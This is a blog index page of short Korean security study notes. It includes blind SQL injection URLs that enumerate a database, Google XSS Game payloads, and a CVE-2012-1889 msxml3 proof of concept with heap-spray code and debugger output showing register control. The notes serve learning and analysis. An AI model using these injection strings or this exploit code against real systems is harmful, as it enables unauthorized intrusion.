@@ -1,0 +1,848 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>My Octopress Blog</title>
+  <meta name="author" content="Your Name">
+
+  
+  <meta name="description" content="Metasploit 에 들어간 add_js_interface_mitm.rb 를 훑어보았다. 일단 vulnerable 한 WebView 의 예제는 다음과 같다. public class MainActivity extends Activity { @SupressLint &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://yoursite.com/posts/13/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="My Octopress Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">My Octopress Blog</a></h1>
+  
+    <h2>A blogging framework for hackers.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="yoursite.com">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/06/20/add-js-interface-mitm/">Add_js_interface_mitm</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-06-20T09:13:56+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>9:13 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Metasploit 에 들어간 add_js_interface_mitm.rb 를 훑어보았다.</p>
+
+<p>일단 vulnerable 한 WebView 의 예제는 다음과 같다.</p>
+
+<pre><code>public class MainActivity extends Activity {
+
+    @SupressLint({ "SetJavaScriptEnabled", "JavascriptInterface" })
+    @Override
+        protected void onCreate(Bundle savedInstanceState) {
+            ...
+            WebView myWebView = (WebView) findViewById(R.id.webView1);
+
+            // not a good idea!
+            WebSettings webSettings = myWebView.getSettings();
+            webSettings.setJavaScriptEnabled(true);
+
+            // terrible idea!
+            myWebView.addJavascriptInterface(new WebAppInterface(this), "Android");
+
+            myWebView.loadUrl("http://droidsec.org/addjsif.html");
+            ...
+</code></pre>
+
+<h4>PoC</h4>
+
+<p><a href="https://github.com/jduck/addjsif/blob/master/add_js_interface_mitm.rb">Metasploit add_js_interface_mitm.rb 모듈</a></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/06/18/android-telephony-api/">Android Telephony API</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-06-18T14:00:58+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>2:00 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h4>Android Telephony APIs</h4>
+
+<p>훑어야 할 API 들.</p>
+
+<ul>
+<li>getDeviceId()</li>
+<li>getSubscriberId()</li>
+<li>getLine1Number</li>
+<li>getSimCountryIso()</li>
+<li>getSimOperator()</li>
+<li>getSimSerialNumber</li>
+<li>getSimState()</li>
+<li>getVoiceMailNumber()</li>
+</ul>
+
+
+<h4>References</h4>
+
+<ul>
+<li><a href="http://en.wikipedia.org/wiki/List_of_CDMA_terminology">List of CDMA terminology</a></li>
+<li><a href="http://developer.android.com/reference/android/telephony/TelephonyManager.html">public class TelephonyManager</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/06/18/a-bug-hunters-diary/">A Bug Hunter's Diary</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-06-18T12:12:09+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>12:12 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h3>VLC 0.9.4 on the Microsoft Windows Vista SP1 (32-bit)</h3>
+
+<h4>integer</h4>
+
+<p>vlc-0.9.4\include\vlc_demux.h</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/06/14/blind-sql-injection/">Blind SQL Injection</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-06-14T01:49:20+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>1:49 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h4>Blind SQL injection</h4>
+
+<p>Case</p>
+
+<pre><code>UNAME = "' or (ascii(substr(select user(),1,1))&gt;63) --"
+PASS = ""
+QUERY = "select * from users where uname='" +UNAME+ "' and pass='" +PASS+ "'"
+</code></pre>
+
+<p>이런 상황에서 QUERY 는 다음과 같이 eval 된다.</p>
+
+<pre><code>select * from users where uname='' or (ascii(substr(select user(),1,1))&gt;63) --' and pass=''
+</code></pre>
+
+<p><code>uname=''</code> 을 만족하는 row 는 없을테니, <code>or</code> 뒷부분에 따라, 전체 query 의 결과가 달라진다.
+이 차이가 HTTP Response Code 로 나타날 수도 있고, data 의 내용에 차이가 생길수도 있다.
+SQL WaitFor 로 Delay 를 삽입할 수도 있다.
+Query 결과가 화면에 덤프되지는 않지만, 이런 미세한 차이를 보고 query 의 결과값을 추측하는 것이다.</p>
+
+<p>우선 DB 종류를 확인.</p>
+
+<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20@@version),1,1))=94--
+</code></pre>
+
+<p>DB 이름을 덤프.</p>
+
+<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20DB_NAME(0)),1,1))=94--
+</code></pre>
+
+<p>TABLE 을 덤프.</p>
+
+<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20top%201%20TABLE_NAME%20from%20INFORMATION_SCHEMA.TABLES),1,1))=94--
+</code></pre>
+
+<p>TABLE schema 를 덤프.</p>
+
+<pre><code>select top 1 COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='xxx_acesso';
+</code></pre>
+
+<p>그럼 쓸만한 query 들을 얻기 위해, Havij 가 사용하는 SQL query 들을 분석하도록 한다.</p>
+
+<h4>Havij</h4>
+
+<ul>
+<li><a href="http://www.troyhunt.com/2012/10/hacking-is-childs-play-sql-injection.html">Hacking is child&rsquo;s play - SQL injection with Havij by 3 year old</a></li>
+<li><a href="http://www.youtu.be/Fp47G4MQFvA">YouTube: Hacking is child&rsquo;s play - SQL injection with Havij by 3 year old</a></li>
+</ul>
+
+
+<h4>BBQSQL</h4>
+
+<ul>
+<li><a href="http://www.youtube.com/watch?v=Dh9Pa0kDfsc">DEFCON 20: Rapid Blind SQL Injection</a></li>
+<li><a href="https://github.com/Neohapsis/bbqsql">bbqsql github repo</a></li>
+</ul>
+
+
+<h4>SQL injection 에 관해 읽을만한 글은</h4>
+
+<ul>
+<li><a href="https://media.blackhat.com/bh-us-12/Turbo/Galbreath/BH_US_12_Galbreath_Libinjection_Slides.pdf">libinjection</a></li>
+<li><a href="http://www.slideshare.net/nickgsuperstar/new-techniques-in-sql-obfuscation">New Techniques in SQLi Obfuscation</a></li>
+</ul>
+
+
+<h4>Tools</h4>
+
+<ul>
+<li>bbqsql</li>
+<li>sqlmap</li>
+<li>sqlninja</li>
+<li>BSQL Hacker</li>
+<li>the Mole</li>
+<li>Havij</li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/06/02/dissecting-the-android-bouncer/">Dissecting the Android Bouncer</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-06-02T10:00:56+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2014</span></span> <span class='time'>10:00 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>찰리 밀러의 발표 <a href="https://jon.oberheide.org/files/summercon12-bouncer.pdf">Dissecting The Android Bouncer</a> 를 읽어보았다.</p>
+
+<h3>Android Bouncer</h3>
+
+<p>마켓에 제출된 App 에 대한 자동화된 스캐닝을 수행하는 서비스. Malware 나 스파이웨어, Trojan 을 찾기 위함.</p>
+
+<h3>Fingerprinting the bouncer</h3>
+
+<p>C&amp;C 로 connect back 하는 간단한 앱을 안드로이드 마켓에 제출했다.</p>
+
+<p>QEMU 베이스의 에뮬레이터에서 돌린다.</p>
+
+<p><a href="http://static.usenix.org/event/woot09/tech/full_papers/paleari.pdf">A fistfull of red-pills: How to automatically generate procedures to detect CPU emulators</a></p>
+
+<p>이 사람들&hellip; <a href="http://www.youtube.com/watch?v=ZEIED2ZLEbQ">Remote connect-back shell</a> 까지 돌려봤다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/06/01/google-xss-game-area/">Google XSS Game Area</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-06-01T18:52:28+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>6:52 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://xss-game.appspot.com/">Google XSS Game Area</a></p>
+
+<h3>Level 1</h3>
+
+<p>Search form 에</p>
+
+<pre><code>a&lt;script&gt;alert('hi');&lt;/script&gt;
+</code></pre>
+
+<h3>Level 2</h3>
+
+<pre><code>&lt;blockquote&gt; 안에서도 &lt;img&gt; 는 먹으니까. &lt;img src='hi.jpg' onerror='alert("hi");'&gt;
+</code></pre>
+
+<h3>Level 3</h3>
+
+<pre><code>function chooseTab(num) {
+    ...
+    html += "&lt;img src='/static/level3/cloud" + num + ".jpg' /&gt;"
+    $('#tabContent').html(html);
+
+    window.location.hash = num;
+    ...
+}
+...
+window.onload = function() {
+    if (event.source == parent) {
+        chooseTab(self.location.hash.substr(1));
+    }
+}
+</code></pre>
+
+<p>URL 의 hash 부분에 html 이 influenced 되니까, 브라우저의 URL 표시창의 <code>#</code> 뒷부분에 입력한다.</p>
+
+<pre><code>#'onerror="alert('hi');"&gt;
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/05/31/debugging-android/">Debugging Android</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-05-31T20:50:15+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>31</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>8:50 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>기본적인 툴들을 인스톨한다.</p>
+
+<ul>
+<li>Android shell 은 MirBSD Korn shell. 불편하니 sshd 나 dropbear 를 인스톨한다.</li>
+<li>Android 의 대부분의 CLI 커맨드는 toolbox 로 구현되었다. busybox 를 인스톨한다.</li>
+<li>Emulator 의 /system/xbin 에 있는 툴들을 pull 해서, device 로 push 한다. Android 버전이 맞아야 하고, <code>objdump</code> 로 필요한 라이브러리를 파악해서 같이 옮겨준다.</li>
+</ul>
+
+
+<p>Dalvik 과 인터페이스하는 CLI 툴들.</p>
+
+<ul>
+<li>am: Interface to activity manager</li>
+<li>bmgr: Backup Manager</li>
+<li>content: Interface with Android Content Providers</li>
+<li>ime</li>
+<li>input</li>
+<li>monkey</li>
+<li>pm</li>
+<li>settings</li>
+<li>svc</li>
+<li>wm</li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/05/21/heaplib-2-dot-0/">heapLib 2.0</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-05-21T19:38:45+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>7:38 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><ul>
+<li><a href="http://retrogod.altervista.org/heapLib_js.html">Alexander Sotirov 의 heapLib</a></li>
+<li><a href="http://blog.ioactive.com/2013/11/heaplib-20.html">IOActive 의 Chris Valesek 이 공개한 heapLib2.0</a></li>
+<li><a href="https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Whitepaper/bh-eu-07-sotirov-WP.pdf">BlackHat 07 Alexander Sotirov, Heap Feng Shui</a></li>
+<li><a href="https://www.blackhat.com/presentations/bh-usa-08/Sotirov_Dowd/bh08-sotirov-dowd.pdf">Blackhat 08 Alexander Sotirov, Bypassing Browser Memory Protections</a></li>
+</ul>
+
+
+<p>여러 화일들이 있는데, 이중에서 유요한 것은 heapLib2.js</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/05/21/cve-2012-1889-microsoft-xml-core-services-rce/">CVE-2012-1889: Microsoft XML Core Services RCE</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-05-21T14:14:37+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>2:14 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>오래된 버그지만, msxml3.dll 을 공격하는 CVE-2012-1889 에 대한 글.</p>
+
+<p>먼저 POC.</p>
+
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;object classid='clsid:f6D90f11-9c73-11d3-b32e-00c04F990bb4' id='ca
+llAX'&gt;&lt;/object&gt;
+&lt;script type='text/javascript'&gt;
+function getValue() {
+    document.getElementById("callAX").object.definition(0);
+}
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body onload='getValue()'&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>windbg 로 조사.</p>
+
+<pre><code>Microsoft (R) Windows Debugger Version 6.12.0002.633 AMD64
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+This exception may be expected and handled.
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\SysWOW64\msxml3.dll - 
+msxml3!DllRegisterServer+0x889b:
+7221e1b0 ff5118          call    dword ptr [ecx+18h]  ds:002b:fc771901=????????
+0:004:x86&gt; r
+eax=72210ae0 ebx=00000000 ecx=fc7718e9 edx=00000001 esi=72210ae0 edi=0348ee20
+eip=7221e1b0 esp=0348eaa4 ebp=0348ebe0 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+msxml3!DllRegisterServer+0x889b:
+7221e1b0 ff5118          call    dword ptr [ecx+18h]  ds:002b:fc771901=????????
+</code></pre>
+
+<p><code>call dword ptr [ecx+18h]</code> 에서 crash 가 발생했다. <code>ecx</code> 의 값은 0xfc7718e9</p>
+
+<p>콜스택을 까보자.</p>
+
+<pre><code>0:004:x86&gt; k
+ChildEBP RetAddr  
+WARNING: Stack unwind information not available. Following frames may be wrong.
+0348ebe0 72201244 msxml3!DllRegisterServer+0x889b
+0348ec1c 72201d4e msxml3!DllGetClassObject+0x23e1b
+0348ec5c 72201ce7 msxml3!DllGetClassObject+0x24925
+0348ec90 72202213 msxml3!DllGetClassObject+0x248be
+0348ecec 72202195 msxml3!DllGetClassObject+0x24dea
+0348ed1c 72aea22a msxml3!DllGetClassObject+0x24d6c
+0348ed58 72aea175 JSCRIPT!IDispatchExInvokeEx2+0x104
+0348ed94 72aea3f6 JSCRIPT!IDispatchExInvokeEx+0x6a
+0348ee54 72aea4a0 JSCRIPT!InvokeDispatchEx+0x98
+0348ee88 72afd8c8 JSCRIPT!VAR::InvokeByName+0x139
+0348eed4 72afd96f JSCRIPT!VAR::InvokeDispName+0x7d
+0348ef00 72afe3e7 JSCRIPT!VAR::InvokeByDispID+0xce
+0348f09c 72af5c9d JSCRIPT!CScriptRuntime::Run+0x2b80
+0348f184 72af5bfb JSCRIPT!ScrFncObj::CallWithFrameOnStack+0xce
+0348f1cc 72af74ac JSCRIPT!ScrFncObj::Call+0x8d
+0348f250 72af4ea4 JSCRIPT!NameTbl::InvokeInternal+0x141
+0348f280 72afe3e7 JSCRIPT!VAR::InvokeByDispID+0x17f
+0348f41c 72af5c9d JSCRIPT!CScriptRuntime::Run+0x2b80
+0348f504 72af5bfb JSCRIPT!ScrFncObj::CallWithFrameOnStack+0xce
+0348f54c 72af5e11 JSCRIPT!ScrFncObj::Call+0x8d
+0348f5c8 72aef3ee JSCRIPT!CSession::Execute+0x15f
+0348f6b0 72aeea2e JSCRIPT!NameTbl::InvokeDef+0x1b5
+0348f734 72ae96de JSCRIPT!NameTbl::InvokeEx+0x12c
+0348f75c 72d2aa7b JSCRIPT!NameTbl::Invoke+0x70
+0348f7f0 72d2ab66 MSHTML!CWindow::ExecuteTimeoutScript+0x87
+0348f848 72d56af7 MSHTML!CWindow::FireTimeOut+0xb6
+0348f858 72d51e57 MSHTML!CStackPtrAry&lt;unsigned long,12&gt;::GetStackSize+0xb6
+0348f87c 752c6238 MSHTML!GlobalWndProc+0x183
+0348f8a8 752c68ea USER32!InternalCallWinProc+0x23
+0348f920 752c7d31 USER32!UserCallWinProcCheckWow+0x109
+0348f980 752c7dfa USER32!DispatchMessageWorker+0x3bc
+0348f990 745204a6 USER32!DispatchMessageW+0xf
+0348fa08 74530446 IEFRAME!CTabWindow::_TabWindowThreadProc+0x452
+0348fac0 760649bd IEFRAME!LCIETab_ThreadProc+0x2c1
+0348fad0 75d03677 iertutil!CIsoScope::RegisterThread+0xab
+0348fadc 776d9d72 KERNEL32!BaseThreadInitThunk+0xe
+0348fb1c 776d9d45 ntdll_776a0000!__RtlUserThreadStart+0x70
+0348fb34 00000000 ntdll_776a0000!_RtlUserThreadStart+0x1b
+</code></pre>
+
+<p>디스어셈블을 해보자.</p>
+
+<pre><code>7221e18f 8b45ec          mov     eax,dword ptr [ebp-14h]
+7221e192 8bf0            mov     esi,eax
+7221e194 3bc3            cmp     eax,ebx
+7221e196 7429            je      msxml3!DllRegisterServer+0x88ac (7221e1c1)
+7221e198 ff7528          push    dword ptr [ebp+28h]
+7221e19b 8b08            mov     ecx,dword ptr [eax]
+7221e19d ff7524          push    dword ptr [ebp+24h]
+7221e1a0 ff7520          push    dword ptr [ebp+20h]
+7221e1a3 57              push    edi
+7221e1a4 6a03            push    3
+7221e1a6 ff7514          push    dword ptr [ebp+14h]
+7221e1a9 68c4d31f72      push    offset msxml3!DllGetClassObject+0x1ff9b (721fd3c4)
+7221e1ae 53              push    ebx
+7221e1af 50              push    eax
+7221e1b0 ff5118          call    dword ptr [ecx+18h] &lt;--- !!!
+7221e1b3 89450c          mov     dword ptr [ebp+0Ch],eax
+7221e1b6 8b06            mov     eax,dword ptr [esi]
+7221e1b8 56              push    esi
+7221e1b9 ff5008          call    dword ptr [eax+8]
+7221e1bc e99c3afeff      jmp     msxml3!DllGetClassObject+0x24834 (72201c5d)
+</code></pre>
+
+<p>IDA Pro 에서 msxml3.dll 을 로드한다.</p>
+
+<p><img src="/images/cve-2012-1889.png"></p>
+
+<p>Access violation 이 나는 함수는 <code>_dispatchImpl::InvokeHelper</code>.</p>
+
+<pre><code>__int32 __stdcall _dispatchImpl::InvokeHelper(void *, 
+    struct DISPATCHINFO *, 
+    __int32, 
+    unsigned __int32, 
+    char, 
+    struct tagDISPPARAMS *, 
+    struct tagVARIANT *,
+    struct tagEXCEPINFO *,
+    unsigned int *)
+</code></pre>
+
+<p>Access violation 이 나는 이유는 obj.definition() 함수의 call path 어딘가에서 uninitialized local variable 을 참조하였기때문.</p>
+
+<p><code>mov ecx,[eax]</code> 로 <code>ecx</code> 를 셋업하고나서, <code>call dword ptr [ecx+18h]</code> 를 하기때문에, eax 를 컨트롤 할 수 있어야 한다.</p>
+
+<p>obj.definition() 함수 call path 에서 uninitialized local variable 을 참조하는 버그를 활용하기 위해, stack spraying 을 수행한다.
+<code>pic.src = src</code> 가 stack sparying 을 진행하는 코드. <code>pic.nameProp</code> 으로 참조를 해준다.</p>
+
+<pre><code>function getValue() {
+    var obj = document.getElementById("callAX").object
+    var src = unescape("%u0c08%u0c0c");
+    while (src.length &lt; 0x1002) src += src;
+    src = "\\\\\\\\xxx" + src;
+    src = src.substr(0, 0x1000 - 10);
+    var pic = document.createElement("img");
+    pic.src = src;
+    pic.nameProp;
+    obj.definition(0);
+}
+</code></pre>
+
+<p>으로 하여 crash 를 만든다.</p>
+
+<pre><code>722ee19b 8b08   mov ecx,dword ptr [eax]
+0:005:x86&gt; r
+eax=0c0c0c08 ebx=00000000 ecx=723115da edx=00000001 esi=0c0c0c08 edi=0326f028
+eip=722ee19b esp=0326eccc ebp=0326ede8 iopl=0
+</code></pre>
+
+<p>eax 가 컨트롤되고 있다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/05/21/certificate-pinning-on-android/">Certificate Pinning on Android</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-05-21T13:03:01+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>1:03 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="https://media.blackhat.com/bh-us-12/Turbo/Diquet/BH_US_12_Diqut_Osborne_Mobile_Certificate_Pinning_Slides.pdf">BlackHat 2012 에서 발표된 Certificate Pinning 에 관련된 발표</a>.</p>
+
+<pre><code>private InputStream makeRequest(Context context, URL url) {
+    // Load custom Trust Store from a file
+    AssetManager assetManager = context.getAssets();
+    InputStream keyStoreInputStream = assetManager.open("yourapp.store");
+    KeyStore trustStore = KeyStore.getInstance("BKS");
+    trustStore.load(keyStoreInputStream, "somepass".toCharArray());
+
+    TrustManagerFactory tmf = TrustManagerFactory.getInstance("X509");
+    tmf.init(trustStore);
+
+    // Init an sslContext with the custom Trust Store
+    SSLContext sslContext = SSLContext.getInstance("TLS");
+    sslContext.init(null, tmf.getTrustManagers(), null);
+
+    // Use this sslContext for subsequent HTTPS connections
+    HttpsURLConnection urlConnection = (HttpsURLConnection)url.openConnection();
+    urlConnection.setSSLSocketFactory(sslContext.getSocketFactory());
+
+    return urlConnection.getInputStream();
+}
+</code></pre>
+
+<p>서버의 certificate 을 확인.</p>
+
+<pre><code>openssl s_client -connect www.babo.com:443 -tlsextdebug
+</code></pre>
+
+<p>그럼 왜 Certificate Pinning 을 하는가. PKI 의 신뢰 체인이 한계에 다달았기 때문.</p>
+
+<p>간단하게</p>
+
+<ul>
+<li>Root CA 가 너무 많다.</li>
+<li>Root CA 를 믿을 수 없다.</li>
+</ul>
+
+
+<p>Browser 같이 불특정 다수의 웹 사이트를 상대해야 하는 경우라면 어쩔 수 없지만,
+모바일 전용 앱과 같은 경우 한두개의 서버만 상대하면 되기때문에, Certificate Pinning 을 사용하는 것이 더 안전하다.</p>
+
+<ul>
+<li><a href="http://nelenkov.blogspot.kr/2012/12/certificate-pinning-in-android-42.html">Certificate pinning in Android 4.2</a></li>
+<li><a href="https://www.imperialviolet.org/2011/05/04/pinning.html">Public key pinning (04 May 2011)</a></li>
+<li><a href="http://h30499.www3.hp.com/t5/Fortify-Application-Security/Certificate-Pinning-for-Mobile-Applications/ba-p/6223897#.U6OGK5S1bOM">Certificate Pinning for Mobile Applications</a></li>
+</ul>
+
+
+<p>Certificate Pinning 이 적용된 App 은 리버싱하기가 불편하기 때문에, disable 시키는 kill-switch patch 를 적용한다.</p>
+
+<ul>
+<li><a href="https://github.com/iSECPartners/ios-ssl-kill-switch">github.com/iSECPartners/ios-ssl-kill-switch</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/posts/14">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/posts/12">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/10/02/the-inside-story-behind-ms08-067/">The Inside Story Behind MS08-067</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/17/rop-and-arm/">ROP and ARM</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/sophail-applied-attacks-against-sophos-antivirus/">Sophail: Applied Attacks Against Sophos Antivirus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/stagefright/">Stagefright</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Your Name -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
